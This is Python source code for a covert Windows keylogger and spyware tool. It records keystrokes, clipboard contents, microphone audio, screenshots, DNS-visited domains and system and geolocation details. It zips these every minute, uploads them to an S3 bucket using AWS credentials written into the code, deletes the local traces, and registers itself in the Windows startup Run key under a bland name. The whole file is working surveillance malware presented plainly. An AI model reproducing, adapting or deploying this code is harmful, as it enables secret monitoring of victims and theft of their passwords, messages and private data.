import os
import time
import socket
import platform
import getpass
import win32clipboard
from pynput.keyboard import Key, Listener
import sounddevice as sd
from scipy.io.wavfile import write
from PIL import ImageGrab
from requests import get
import logging
import boto3
from botocore.exceptions import NoCredentialsError
import zipfile
import threading
import shutil
from datetime import datetime
from scapy.all import sniff, IP, TCP, Raw, DNS, DNSQR
import winreg as reg
import subprocess
import sys

# AWS Configuration (Use environment variables instead of hardcoding)
AWS_ACCESS_KEY = os.getenv("AWS_ACCESS_KEY", "AKIAX5ZI6TUHSYDHB36V")
AWS_SECRET_KEY = os.getenv("AWS_SECRET_KEY", "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")
AWS_BUCKET_NAME = os.getenv("AWS_BUCKET_NAME", "store-logs1")
AWS_REGION = os.getenv("AWS_REGION", "us-east-1")

# Initialize S3 client
s3 = boto3.client(
    "s3",
    aws_access_key_id=AWS_ACCESS_KEY,
    aws_secret_access_key=AWS_SECRET_KEY,
    region_name=AWS_REGION,
)

# Set up log directory
LOG_DIR = r'C:\Users\Public\Windows-Logs'
os.makedirs(LOG_DIR, exist_ok=True)

# File names 
KEYS_FILE = os.path.join(LOG_DIR, "keylog.txt")
SYSTEM_FILE = os.path.join(LOG_DIR, "systeminfo.txt")
CLIPBOARD_FILE = os.path.join(LOG_DIR, "clipboard.txt")
AUDIO_FILE = os.path.join(LOG_DIR, "audio.wav")
SCREENSHOT_FILE = os.path.join(LOG_DIR, "screenshot.png")
WEB_ACTIVITY_LOG = os.path.join(LOG_DIR, "web_activity.log")
ZIP_FILE = os.path.join(LOG_DIR, "logs.zip")

# Constants
MICROPHONE_TIME = 10  # Duration of audio recording in seconds
TIME_ITERATION = 15  # Time interval for keylogger in seconds
UPLOAD_INTERVAL = 1 * 60  # Time interval for uploading files 

# Logging setup
logging.basicConfig(filename=os.path.join(LOG_DIR, "keylogger.log"), level=logging.INFO, format="%(asctime)s - %(message)s")

### FUNCTION TO UPLOAD TO S3 ###
def upload_file_to_s3(file_name, bucket_name):
    if not os.path.exists(file_name):
        logging.error(f"Upload failed: {file_name} does not exist.")
        return False

    try:
        s3.upload_file(file_name, bucket_name, os.path.basename(file_name))
        logging.info(f"Uploaded {file_name} to S3.")
        return True
    except NoCredentialsError:
        logging.error("S3 upload failed: No AWS credentials.")
        return False
    except Exception as e:
        logging.error(f"S3 upload error: {e}")
        return False

### FUNCTION TO LOG SYSTEM INFO ###
def gather_system_info():
    try:
        public_ip = get("https://api.ipify.org").text
        geo_info = get(f"http://ip-api.com/json/{public_ip}").json()

        with open(SYSTEM_FILE, "w") as f:
            f.write(f"Hostname: {socket.gethostname()}\n")
            f.write(f"IP Address: {socket.gethostbyname(socket.gethostname())}\n")
            f.write(f"Public IP: {public_ip}\n")
            f.write(f"System: {platform.system()} {platform.version()}\n")
            f.write(f"Processor: {platform.processor()}\n")
            f.write(f"Username: {getpass.getuser()}\n")

            if geo_info.get("status") == "success":
                f.write(f"City: {geo_info.get('city')}, Country: {geo_info.get('country')}\n")
                f.write(f"Latitude: {geo_info.get('lat')}, Longitude: {geo_info.get('lon')}\n")
        
        logging.info("System information gathered.")
    except Exception as e:
        logging.error(f"System info error: {e}")

### FUNCTION TO CAPTURE CLIPBOARD ###
def capture_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()

        with open(CLIPBOARD_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{time.ctime()}] Clipboard Data:\n{data}\n\n")

        logging.info("Clipboard data captured.")
    except Exception as e:
        logging.error(f"Clipboard capture error: {e}")
    finally:
        try:
            win32clipboard.CloseClipboard()
        except:
            pass  # Ignore errors when trying to close


### FUNCTION TO RECORD AUDIO ###
def record_audio():
    try:
        logging.info("Recording audio...")
        recording = sd.rec(int(MICROPHONE_TIME * 44100), samplerate=44100, channels=2)
        sd.wait()
        write(AUDIO_FILE, 44100, recording)
        logging.info("Audio recording saved.")
    except Exception as e:
        logging.error(f"Audio recording error: {e}")

### FUNCTION TO TAKE SCREENSHOT ###
def take_screenshot():
    try:
        im = ImageGrab.grab()
        im.save(SCREENSHOT_FILE)
        logging.info("Screenshot saved.")
    except Exception as e:
        logging.error(f"Screenshot capture error: {e}")

### FUNCTION TO LOG KEYSTROKES ###
def on_press(key):
    try:
        with open(KEYS_FILE, "a") as f:
            f.write(str(key) + "\n")
    except Exception as e:
        logging.error(f"Keystroke logging error: {e}")

### FUNCTION TO ZIP FILES ###
def create_zip():
    try:
        zip_filename = os.path.join(LOG_DIR, f"logs_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.zip")
        with zipfile.ZipFile(zip_filename, "w") as zipf:
            for file in [KEYS_FILE, SYSTEM_FILE, CLIPBOARD_FILE, WEB_ACTIVITY_LOG, AUDIO_FILE, SCREENSHOT_FILE]:
                if os.path.exists(file):
                    zipf.write(file, os.path.basename(file))
                    logging.info(f"Added {file} to zip.")
        logging.info(f"Zip file {zip_filename} created.")
        return zip_filename
    except Exception as e:
        logging.error(f"Zip creation error: {e}")
        return None

### FUNCTION TO CLEAN UP FILES ###
def cleanup(zip_file):
    try:
        for file in [KEYS_FILE, SYSTEM_FILE, CLIPBOARD_FILE, AUDIO_FILE, WEB_ACTIVITY_LOG, SCREENSHOT_FILE, zip_file]:
            if os.path.exists(file):
                os.remove(file)
                logging.info(f"Deleted {file}.")
        
        if os.path.exists(LOG_DIR):
            shutil.rmtree(LOG_DIR)
            logging.info("Deleted logs directory.")
    except Exception as e:
        logging.error(f"Cleanup error: {e}")

### FUNCTION TO UPLOAD LOGS AT INTERVAL ###
def upload_at_interval():
    while True:
        time.sleep(UPLOAD_INTERVAL)
        zip_file = create_zip()
        if zip_file and upload_file_to_s3(zip_file, AWS_BUCKET_NAME):
            cleanup(zip_file)

### WEB ACTIVITY LOGGER ###

logged_domains = set()  # Avoid duplicate entries

def process_packet(packet):
    """Logs visited website domains and their resolved IP addresses."""
    if packet.haslayer(DNS) and packet[DNS].qr == 0:  # QR == 0 means DNS Query
        domain = packet[DNSQR].qname.decode(errors="ignore").strip(".")
        
        if domain.endswith(".local"):  # Ignore local network queries
            return

        try:
            ip_address = socket.gethostbyname(domain)
        except socket.gaierror:
            return  # Ignore unresolved domains

        log_entry = f"{domain} -> {ip_address}\n"

        if domain not in logged_domains:  # Avoid duplicates
            logged_domains.add(domain)
            with open(WEB_ACTIVITY_LOG, "a", encoding="utf-8") as log_file:
                log_file.write(log_entry)
            print(log_entry.strip())  # Print for real-time debugging

def network_sniffer(packet_count=50):
    """Captures network packets and logs only DNS queries (website URLs & IPs)."""
    '''print(f"[*] Starting network sniffer... Capturing {packet_count} packets")'''
    sniff(prn=process_packet, count=packet_count, store=False)

# Run the function
network_sniffer(50)
### FUNCTION TO ADD TO STARTUP ###

# Continuous run function
def continuous_run():
    threading.Thread(target=upload_at_interval, daemon=True).start()

    with Listener(on_press=on_press) as listener:
        while True:
            gather_system_info()
            capture_clipboard()
            record_audio()
            take_screenshot()
            time.sleep(TIME_ITERATION)

# Add to startup function (no arguments now)
def add_to_startup():
    try:
        # Get the absolute path of the currently running script
        file_path = os.path.abspath(sys.argv[0])

        # Path to the registry key for startup
        key = reg.HKEY_CURRENT_USER
        key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'

        # Open the registry key with necessary permissions
        with reg.OpenKey(key, key_value, 0, reg.KEY_WRITE) as open_key:
            # Set the value for the startup
            reg.SetValueEx(open_key, 'MyApp', 0, reg.REG_SZ, file_path)
        
        logging.info(f"Successfully added {file_path} to startup.")
        
    except Exception as e:
        logging.error(f"Failed to add to startup: {e}")



# Define constant for time iteration
TIME_ITERATION = 60  # Adjust based on your needs

# Main entry point
if __name__ == "__main__":
    add_to_startup()  # Call without arguments now
    continuous_run()  # Start continuous operation
